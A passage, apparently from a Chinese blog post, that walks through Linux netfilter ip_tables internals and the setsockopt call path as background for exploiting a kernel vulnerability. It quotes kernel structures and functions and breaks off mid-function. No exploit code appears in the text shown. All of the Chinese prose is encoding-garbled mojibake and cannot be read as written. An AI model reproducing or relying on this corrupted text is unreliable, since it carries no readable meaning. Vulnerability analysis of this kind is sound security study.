user chains) can possibly be made.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> stacksize;<br><span class="hljs-type">void</span> ***jumpstack;<span class="hljs-comment">// æˆ‘è¶…ï¼Œä¸‰çº§æŒ‡é’ˆï¼</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> entries[] __aligned(<span class="hljs-number">8</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨æ¯å¼   table ä¸Šæœ‰å¤šä¸ª chainï¼Œå¯¹åº”è¡¨ç¤ºæŠ¥æ–‡çš„æ‹¦æˆªå¤„ç†ç‚¹ï¼Œä¾‹å¦‚ç½‘ç»œå±‚ä¸­çš„ IPåè®® ä¾¿æœ‰ 5 ä¸ªæ‹¦æˆªç‚¹ï¼š</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs coq">---&gt;[NF_IP_PRE_ROUTING]---&gt;[ROUTE]---&gt;[NF_IP_FORWARD]---&gt;[NF_IP_POST_ROUTING]---&gt;<br>                              |                        <span class="hljs-type">^</span><br><span class="hljs-type">                              |                        |</span><br><span class="hljs-type">                              |                     [ROUTE</span>]<br>                              v                        |<br>                       <span class="hljs-type">[NF_IP_LOCAL_IN</span>]        [NF_IP_LOCAL_OUT]<br>                              |                        <span class="hljs-type">^</span><br><span class="hljs-type">                              |                        |</span><br><span class="hljs-type">                              v</span>                        |<br>                             <span class="hljs-type">--------Local</span> Process-------<br></code></pre></td></tr></table></figure><p>åœ¨æ¯ä¸ª chain ä¸­è¿˜æœ‰ä¸€äº›ç”¨æˆ·é…ç½®çš„ ruleï¼Œä¸€æ¡ rule å¯èƒ½åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªåŒ¹é…è§„åˆ™ï¼ˆmatchï¼‰å’Œä¸€ä¸ªæ‰§è¡ŒåŠ¨ä½œï¼ˆtargetï¼‰ï¼Œè‹¥æŠ¥æ–‡ match äº†ï¼Œåˆ™æ‰§è¡Œ target æ¥å¤„ç†æŠ¥æ–‡ï¼›æ ‡å‡†çš„åŒ¹é…å…ƒç´ åŒ…å«æº/ç›®çš„IPåœ°å€ã€æ¥æ”¶/å‘é€è®¾å¤‡ã€ä¼ è¾“å±‚åè®®è¿™äº”ä¸ªå…ƒç´ ï¼Œæ ‡å‡†çš„æ‰§è¡ŒåŠ¨ä½œåŒ…å« <code>accept</code>ã€<code>drop</code>ã€<code>queue</code>ã€<code>return</code></p><p>æ¯æ¡ rule ä½¿ç”¨ä¸€ä¸ª <code>ipt_entry</code> ç»“æ„è¡¨ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* This structure defines each of the firewall rules.  Consists of 3</span><br><span class="hljs-comment">   parts which are 1) general IP header stuff 2) match specific</span><br><span class="hljs-comment">   stuff 3) the target to perform if the rule matches */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_entry</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_ip</span> <span class="hljs-title">ip</span>;</span><br><br><span class="hljs-comment">/* Mark with fields that we care about. */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nfcache;<br><br><span class="hljs-comment">/* Size of ipt_entry + matches */</span><br>__u16 target_offset;<br><span class="hljs-comment">/* Size of ipt_entry + matches + target */</span><br>__u16 next_offset;<br><br><span class="hljs-comment">/* Back pointer */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> comefrom;<br><br><span class="hljs-comment">/* Packet and byte counters. */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_counters</span> <span class="hljs-title">counters</span>;</span><br><br><span class="hljs-comment">/* The matches (if any), then the target. */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> elems[<span class="hljs-number">0</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p>è€Œ rule å’Œ target åˆ™åˆ†åˆ«ä½¿ç”¨ <code>xt_entry_match</code> ä¸ <code>xt_entry_target</code> ç»“æ„è¡¨ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_entry_match</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u16 match_size;<br><br><span class="hljs-comment">/* Used by userspace */</span><br><span class="hljs-type">char</span> name[XT_EXTENSION_MAXNAMELEN];<br>__u8 revision;<br>&#125; user;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u16 match_size;<br><br><span class="hljs-comment">/* Used inside the kernel */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_match</span> *<span class="hljs-title">match</span>;</span><br>&#125; kernel;<br><br><span class="hljs-comment">/* Total length */</span><br>__u16 match_size;<br>&#125; u;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_entry_target</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u16 target_size;<br><br><span class="hljs-comment">/* Used by userspace */</span><br><span class="hljs-type">char</span> name[XT_EXTENSION_MAXNAMELEN];<br>__u8 revision;<br>&#125; user;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u16 target_size;<br><br><span class="hljs-comment">/* Used inside the kernel */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_target</span> *<span class="hljs-title">target</span>;</span><br>&#125; kernel;<br><br><span class="hljs-comment">/* Total length */</span><br>__u16 target_size;<br>&#125; u;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p><code>table-&gt;chain-&gt;rule</code> çš„å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¯¹äºå•ä¸ª rule åœ¨æ¯ä¸ª CPU ä¸Šéƒ½ç»´æŠ¤äº†ä¸€ä»½ä»–çš„æ‹·è´ï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯ä¸ºäº†å‡å°‘é”çš„ä½¿ç”¨ã€å¢åŠ  L1 cache çš„å‘½ä¸­æ¬¡æ•°ï¼Œä»¥ç©ºé—´æ¢æ—¶é—´</p><p><img src="https://s2.loli.net/2022/03/29/4hwpn7HdagVIiQL.png" alt="image.png"></p><h2 id="64-ä½ä¸‹çš„-setsockopt-ç³»ç»Ÿè°ƒç”¨"><em>64 ä½ä¸‹çš„ setsockopt ç³»ç»Ÿè°ƒç”¨</em></h2><blockquote><p>å’Œæœ¬æ¼æ´æ²¡æœ‰å…³è”ï¼Œä½†æ˜¯ç¬”è€…æ²¡æ³¨æ„ç»™åˆ†æäº†ä¸€éâ€¦èŠ±äº†æŒºå¤šåŠ›æ°”æ‰€ä»¥è¿™é‡Œä¹Ÿä¸æƒ³åˆ äº†ï¼Œå°±ç•™ä¸‹æ¥äº†ï¼Œå¦‚æœåªå…³æ³¨æ¼æ´æœ¬èº«çš„å¯ä»¥ç›´æ¥è·³è¿‡XD æ„Ÿå…´è¶£çš„è¯å¯ä»¥ç®€å•çœ‹çœ‹</p></blockquote><p>ç”¨æˆ·è¿›ç¨‹ä¸ Netfilter é—´è¿›è¡Œé€šä¿¡ä¸»è¦æ˜¯é€šè¿‡ <code>getsockopt</code> ä¸ <code>setsockopt</code> è¿™ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œè¿™æ˜¯ä¸€å¥—é…å¯¹ä½¿ç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼Œç”¨ä»¥è¯»å–æˆ–ä¿®æ”¹å¥—æ¥å­—çš„é…ç½®ä¿¡æ¯ï¼Œæˆ‘ä»¬è¿™ä¸€æ¬¡ä¸»è¦å…³æ³¨ <code>setsockopt</code></p><blockquote><p>æœ¬æ¬¡æ¼æ´åˆ©ç”¨ä¸­æˆ‘ä»¬åˆ›å»º socket æ—¶ä½¿ç”¨ <code>socket(AF_INTE, SOCK_STREAM, 0)</code>ï¼Œæ•…åé¢æ¶‰åŠåˆ°çš„ socket æºç éƒ½ä¼šé¡ºç€è¿™ä¸ªè·¯å¾„åˆ†æ</p></blockquote><p>åœ¨ <code>setsockopt</code> ç³»ç»Ÿè°ƒç”¨ä¸­ä¼šè°ƒç”¨åˆ°å†…æ ¸ä¸­çš„ <code>__sys_setsockopt()</code> ï¼Œæœ€ç»ˆè°ƒç”¨åˆ°å¯¹åº”çš„ socket ç»“æ„ä½“çš„å‡½æ•°è¡¨ä¸­çš„ <code>setsockopt</code> å‡½æ•°æŒ‡é’ˆï¼ˆ <code>sock-&gt;ops-&gt;setsockopt()</code>ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __sys_setsockopt(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname,<br>    <span class="hljs-type">char</span> __user *optval, <span class="hljs-type">int</span> optlen)<br>&#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">if</span> (level == SOL_SOCKET)<br>err =<br>    sock_setsockopt(sock, level, optname, optval,<br>    optlen);<br><span class="hljs-keyword">else</span><br>err =<br>    sock-&gt;ops-&gt;setsockopt(sock, level, optname, optval,<br>  optlen);<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°è¡¨å…¶å®æ˜¯åœ¨ socket åˆ›å»ºæ—¶ï¼ˆ<code>__sock_create()</code>ï¼‰è¿›è¡ŒåŠ¨æ€æŒ‡å®šçš„ï¼Œé€šè¿‡å¯¹åº” family æŒ‡å®šçš„åˆ›å»ºå‡½æ•°è¿›è¡Œåˆ›å»ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __sock_create(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-type">int</span> family, <span class="hljs-type">int</span> type, <span class="hljs-type">int</span> protocol,<br> <span class="hljs-keyword">struct</span> socket **res, <span class="hljs-type">int</span> kern)<br>&#123;<br>    <span class="hljs-type">int</span> err;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">socket</span> *<span class="hljs-title">sock</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_proto_family</span> *<span class="hljs-title">pf</span>;</span><br>    <span class="hljs-comment">//...</span><br>rcu_read_lock();<br>pf = rcu_dereference(net_families[family]);<br>err = -EAFNOSUPPORT;<br><span class="hljs-keyword">if</span> (!pf)<br><span class="hljs-keyword">goto</span> out_release;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We will call the -&gt;create function, that possibly is in a loadable</span><br><span class="hljs-comment"> * module, so we have to bump that loadable module refcnt first.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!try_module_get(pf-&gt;owner))<br><span class="hljs-keyword">goto</span> out_release;<br><br><span class="hljs-comment">/* Now protected by module ref count */</span><br>rcu_read_unlock();<br><br>err = pf-&gt;create(net, sock, protocol, kern);<br></code></pre></td></tr></table></figure><p>æ¯”å¦‚è¯´å¯¹äº <code>AF_INET</code> ï¼ˆ<code>PF_INET</code>ï¼‰è€Œè¨€ï¼Œåº”è¯¥ç”¨åˆ°çš„æ˜¯ <code>inet_create()</code> å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_proto_family</span> <span class="hljs-title">inet_family_ops</span> =</span> &#123;<br>.family = PF_INET,<br>.create = inet_create,<br>.owner= THIS_MODULE,<br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨ <code>inet_init()</code> å‡½æ•°ä¸­ä½¿ç”¨ <code>sock_register</code> åœ¨ <code>net_families</code> æ•°ç»„ä¸­æ³¨å†Œäº†è¯¥ç»“æ„ä½“ï¼ˆ<code>__init</code> å®å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸€ä¸ªæ¨¡å—åˆå§‹åŒ–å‡½æ•°ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">inet_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"> *Tell SOCKET that we are alive...</span><br><span class="hljs-comment"> */</span><br><br>(<span class="hljs-type">void</span>)sock_register(&amp;inet_family_ops);<br></code></pre></td></tr></table></figure><p>è€Œåœ¨ <code>inet_create()</code> ä¸­ï¼Œåˆ™æ˜¯éå† æ•°ç»„æ‰¾åˆ°å¯¹åº”ç±»å‹çš„å‡½æ•°è¡¨ç»™åˆ° socketï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">inet_create</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-keyword">struct</span> socket *sock, <span class="hljs-type">int</span> protocol,</span><br><span class="hljs-params">       <span class="hljs-type">int</span> kern)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock</span> *<span class="hljs-title">sk</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_protosw</span> *<span class="hljs-title">answer</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_sock</span> *<span class="hljs-title">inet</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proto</span> *<span class="hljs-title">answer_prot</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> answer_flags;<br><span class="hljs-type">int</span> try_loading_module = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> err;<br><br><span class="hljs-keyword">if</span> (protocol &lt; <span class="hljs-number">0</span> || protocol &gt;= IPPROTO_MAX)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>sock-&gt;state = SS_UNCONNECTED;<br><br><span class="hljs-comment">/* Look for the requested type/protocol pair. */</span><br>lookup_protocol:<br>err = -ESOCKTNOSUPPORT;<br>rcu_read_lock();<br>list_for_each_entry_rcu(answer, &amp;inetsw[sock-&gt;type], <span class="hljs-built_in">list</span>) &#123;<br><br>err = <span class="hljs-number">0</span>;<br><span class="hljs-comment">/* Check the non-wild match. */</span><br><span class="hljs-keyword">if</span> (protocol == answer-&gt;protocol) &#123;<br><span class="hljs-keyword">if</span> (protocol != IPPROTO_IP)<br><span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Check for the two wild cases. */</span><br><span class="hljs-keyword">if</span> (IPPROTO_IP == protocol) &#123;<br>protocol = answer-&gt;protocol;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (IPPROTO_IP == answer-&gt;protocol)<br><span class="hljs-keyword">break</span>;<br>&#125;<br>err = -EPROTONOSUPPORT;<br>&#125;<br>    <span class="hljs-comment">//...</span><br>    sock-&gt;ops = answer-&gt;ops;<br>    answer_prot = answer-&gt;prot;<br></code></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œä½¿ç”¨å†…æ ¸çš„ rcu éå†å® <code>list_for_each_entry_rcu</code> å¯¹ <code>inetsw</code> è¿›è¡Œéå†ï¼Œå®é™…ä¸Šè¯¥é“¾è¡¨é€šè¿‡ <code>inetsw_array</code> å»ºç«‹ï¼Œå¯¹äº <code>IPPROTO_IP</code> è€Œè¨€å…¶å‡½æ•°è¡¨åº”ä¸º <code>inet_stream_ops</code>ï¼ˆæˆ‘ä»¬åœ¨å»ºç«‹ socket æ—¶ protocol æŒ‡å®šä¸º 0ï¼Œå³ <code>IPPROTO_IP</code>ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_protosw</span> <span class="hljs-title">inetsw_array</span>[] =</span><br>&#123;<br>&#123;<br>.type =       SOCK_STREAM,<br>.protocol =   IPPROTO_TCP,<br>.prot =       &amp;tcp_prot,<br>.ops =        &amp;inet_stream_ops,<br>.flags =      INET_PROTOSW_PERMANENT |<br>      INET_PROTOSW_ICSK,<br>&#125;,<br></code></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬åœ¨è¿›è¡Œ setsockopt æ—¶å…¶å®å¯¹åº”åº”è¯¥è°ƒç”¨åˆ° <code>inet_stream_ops</code> ä¸­çš„ <code>sock_common_setsockopt</code>ï¼Œä»–åˆä¼šè°ƒç”¨åˆ° <code>sk-&gt;sk_prot-&gt;setsockopt()</code>ï¼Œå…¶å®å°±æ˜¯ socket ç»“æ„ä½“é‡Œçš„ sock ç»“æ„ä½“é‡Œçš„ sock_common ç»“æ„ä½“çš„ <code>skc_prot</code> æˆå‘˜ï¼ˆ<code>proto</code> ç»“æ„ä½“ç±»å‹ï¼‰çš„ <code>setsockopt</code> å‡½æ•°æŒ‡é’ˆï¼ˆ<s>ä½ å¥—ä½ ğŸ¦„å‘¢</s>ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sock_common_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> socket *sock, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname,</span><br><span class="hljs-params">   <span class="hljs-type">char</span> __user *optval, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock</span> *<span class="hljs-title">sk</span> =</span> sock-&gt;sk;<br><br><span class="hljs-keyword">return</span> sk-&gt;sk_prot-&gt;setsockopt(sk, level, optname, optval, optlen);<br>&#125;<br>EXPORT_SYMBOL(sock_common_setsockopt);<br></code></pre></td></tr></table></figure><p>åˆç»•å›å‰é¢ï¼Œè¿™é‡Œåº”è¯¥æ˜¯å¯¹åº”åˆ° <code>tcp_prot</code> å‡½æ•°è¡¨ï¼Œå¯¹åº”è°ƒç”¨åˆ° <code>tcp_setsockopt()</code>ï¼Œåœ¨å…¬å¼€çš„ exp ä¸­æ¼æ´è§¦å‘è·¯å¾„æŒ‡å®šäº† level ä¸º <code>SOL_IP</code>ï¼Œæ‰€ä»¥è¿™é‡Œåº”è¯¥ä¼šå¯¹åº”è°ƒç”¨åˆ° <code>icsk-&gt;icsk_af_ops-&gt;setsockopt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">tcp_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname, <span class="hljs-type">char</span> __user *optval,</span><br><span class="hljs-params">   <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_connection_sock</span> *<span class="hljs-title">icsk</span> =</span> inet_csk(sk);<br><br><span class="hljs-keyword">if</span> (level != SOL_TCP)<br><span class="hljs-keyword">return</span> icsk-&gt;icsk_af_ops-&gt;setsockopt(sk, level, optname,<br>     optval, optlen);<br><span class="hljs-keyword">return</span> do_tcp_setsockopt(sk, level, optname, optval, optlen);<br>&#125;<br>EXPORT_SYMBOL(tcp_setsockopt);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ <code>inet_csk()</code> å±•å¼€å…¶å®å°±æ˜¯ä¸€ä¸ªå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œé‚£è¿™é‡Œæˆ‘ä»¬åˆè¦è½¬å›å»çœ‹ socket ä¸­ sock ç»“æ„ä½“çš„åˆå§‹åŒ–è¿‡ç¨‹ï¼Œåœ¨ <code>inet_create()</code>  ä¸­ä½¿ç”¨ <code>sock_alloc()</code> åˆ›å»º sock ç»“æ„ä½“ï¼Œæœ€åä¼šè°ƒç”¨åˆ° <code>tcp_v4_init_sock</code>ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹åˆ°å…¶åˆå§‹åŒ–æ‰€ç”¨çš„å‡½æ•°è¡¨ä¸º <code>ipv4_specific</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">tcp_v4_init_sock</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_connection_sock</span> *<span class="hljs-title">icsk</span> =</span> inet_csk(sk);<br><br>tcp_init_sock(sk);<br><br>icsk-&gt;icsk_af_ops = &amp;ipv4_specific;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_TCP_MD5SIG</span><br>tcp_sk(sk)-&gt;af_specific = &amp;tcp_sock_ipv4_specific;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æœ€ååº”è¯¥è°ƒç”¨åˆ° <code>ip_setsockopt</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_connection_sock_af_ops</span> <span class="hljs-title">ipv4_specific</span> =</span> &#123;<br><span class="hljs-comment">//...</span><br>.setsockopt   = ip_setsockopt,<br>.getsockopt   = ip_getsockopt,<br></code></pre></td></tr></table></figure><p>åœ¨  <code>ip_setsockopt</code> ä¸­æœ€ç»ˆè°ƒç”¨åˆ° <code>nf_setsockopt</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">ip_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">int</span> level,</span><br><span class="hljs-params"><span class="hljs-type">int</span> optname, <span class="hljs-type">char</span> __user *optval, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)</span><br>&#123;<br><span class="hljs-type">int</span> err;<br><br><span class="hljs-keyword">if</span> (level != SOL_IP)<br><span class="hljs-keyword">return</span> -ENOPROTOOPT;<br><br>err = do_ip_setsockopt(sk, level, optname, optval, optlen);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> IS_ENABLED(CONFIG_BPFILTER_UMH)</span><br><span class="hljs-keyword">if</span> (optname &gt;= BPFILTER_IPT_SO_SET_REPLACE &amp;&amp;<br>    optname &lt; BPFILTER_IPT_SET_MAX)<br>err = bpfilter_ip_set_sockopt(sk, optname, optval, optlen);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NETFILTER</span><br><span class="hljs-comment">/* we need to exclude all possible ENOPROTOOPTs except default case */</span><br><span class="hljs-keyword">if</span> (err == -ENOPROTOOPT &amp;&amp; optname != IP_HDRINCL &amp;&amp;<br>optname != IP_IPSEC_POLICY &amp;&amp;<br>optname != IP_XFRM_POLICY 